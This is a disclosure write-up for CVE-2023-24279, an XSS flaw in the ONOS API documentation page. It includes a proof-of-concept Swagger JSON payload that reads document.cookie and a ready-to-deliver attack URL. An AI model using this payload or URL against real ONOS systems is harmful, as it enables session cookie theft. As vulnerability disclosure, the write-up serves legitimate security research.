# CVE-2023-24279

Description
------

A cross-site scripting (XSS) vulnerability in Open Networking Foundation ONOS from version v1.9.0 to v2.7.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the url parameter of the API documentation dashboard.


PoC
------

PoC for CVE-2023-24279: [@edoardottt Youtube video](https://www.youtube.com/watch?v=1mSXzzwcGMM)

Vulnerable endpoint: http://localhost:8181/onos/v1/docs/

Payload: 
```json
{
  "swagger" : "2.0",
  "info" : {
    "version" : "1.0.100",
    "title" : "Swagger UI v2.2.10 XSS POC",
    "description" : "Swagger UI v2.2.10 XSS POC",
    "contact" : {
      "name" : "edoardottt",
      "url" : "javascript:alert(document.cookie)",
      "email" : "edoardott@gmail.com"
    },
  },
}
```

Malicious URL ready to be delivered: http://localhost:8181/onos/v1/docs/?url=https://gist.githubusercontent.com/edoardottt/197f4bc482eddb263c47b525268d1628/raw/49ad93f4e5832d6e6af5cf4f9962dd9bebf9f3c1/onos-xss-poc.json

References
------
- https://www.edoardoottavianelli.it/CVE-2023-24279
- https://nvd.nist.gov/vuln/detail/CVE-2023-24279
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24279
- https://github.com/advisories/GHSA-3xmp-jwrr-8f4r
- https://www.tenable.com/cve/CVE-2023-24279
- https://www.opencve.io/cve/CVE-2023-24279
- https://avd.aquasec.com/nvd/2023/cve-2023-24279/
- https://cve.report/CVE-2023-24279

<br>

Useful links while researching for this CVE:

- https://github.com/swagger-api/swagger-ui/pull/3848
- https://github.com/swagger-api/swagger-ui/issues/3847
- https://github.com/swagger-api/swagger-ui/commit/f87eaaa81073a61e30ff0cedee4fd9cd2dd1fca9
- https://github.com/swagger-api/swagger-ui/commit/f87eaaa81073a61e30ff0cedee4fd9cd2dd1fca9#diff-f510249cd192f2f011846a9640aebfd0c96995e744aa55e3b1c2e541da62a9ef
- https://security.snyk.io/vuln/npm:swagger-ui:20171031
- https://security.snyk.io/vuln/npm:swagger-ui:20160721
- https://security.snyk.io/vuln/npm:swagger-ui:20160901
